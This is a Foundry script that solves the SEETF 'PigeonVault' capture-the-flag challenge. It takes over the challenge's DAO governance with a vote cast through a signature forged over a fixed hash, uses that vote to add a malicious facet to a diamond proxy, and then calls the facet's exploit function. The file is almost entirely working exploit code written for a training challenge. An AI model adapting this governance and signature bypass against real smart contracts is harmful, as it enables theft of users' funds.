// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "./challenge/Setup.sol";
import "forge-std/console.sol";
import "./Exploit.sol";

// forge script src/SEETF/PigeonVault/Exploit.s.sol:ExploitScript -vvvvv --private-key $PRIVATE_KEY --fork-url $RPC_URL
// forge script src/SEETF/PigeonVault/Exploit.s.sol:ExploitScript -vvvvv --private-key $PRIVATE_KEY --fork-url $RPC_URL --broadcast --skip-simulation

contract ExploitScript is Script {
    function run() public {
        address setUpContractAddress = 0xC5D2132dB799273074B7336BDb26964c4847e506;
        Setup setup = Setup(payable(setUpContractAddress));
        address pigeonDiamond = address(setup.pigeonDiamond());
        uint256 playerKey = uint256(vm.envBytes32("PRIVATE_KEY"));
        address playerAddress = vm.addr(playerKey);
        playerAddress;

        vm.startBroadcast();

        // !! Execute the parts enclosed in {} separately. !!

        // {
        //     for (uint i = 0; i < 11; i++) {
        //         setup.claim();
        //     }
        //     FeatherCoinFacet(pigeonDiamond).delegate(playerAddress);
        // }

        // ExploitFacet exploitFacet = new ExploitFacet();
        // ExploitFacet exploitFacet = ExploitFacet(0xa617414E6d8237044651177Ce642AB3b7E8CB6D4);

        // uint256 proposalId;

        // {
        //     bytes4[] memory selectors = new bytes4[](1);
        //     selectors[0] = ExploitFacet.exploit.selector;
        //     proposalId = DAOFacet(pigeonDiamond).submitProposal{gas: 10_000_000}(address(exploitFacet), "", IDiamondCut.FacetCut(address(exploitFacet), IDiamondCut.FacetCutAction.Add, selectors));
        //     console.log("proposalId", proposalId);
        // }

        // uint256 proposalId = 4;

        // {
        //     (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerKey, keccak256("\x19Ethereum Signed Message:\n32"));
        //     bytes memory sig = abi.encodePacked(r, s, v);
        //     DAOFacet(pigeonDiamond).castVoteBySig{gas: 1_000_000}(proposalId, true, sig);
        // }

        // {
        //     DAOFacet(pigeonDiamond).executeProposal(proposalId);
        // }

        {
            ExploitFacet(pigeonDiamond).exploit();
            assert(setup.isSolved());
        }

        vm.stopBroadcast();
    }
}
